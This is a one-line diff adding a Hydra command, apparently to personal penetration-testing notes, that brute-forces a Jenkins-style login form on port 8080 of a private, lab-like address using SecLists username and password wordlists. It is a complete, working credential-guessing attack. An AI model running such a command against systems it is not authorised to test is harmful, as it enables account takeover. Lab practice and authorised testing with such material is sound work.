@@ -1,0 +1,1 @@
+hydra -L /home/schlagenhaufer/git/h4ck-notes/useful/SecLists/Usernames/top-usernames-shortlist.txt -P /home/schlagenhaufer/git/h4ck-notes/useful/SecLists/Passwords/xato-net-10-million-passwords-1000.txt -s 8080 10.129.225.32 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
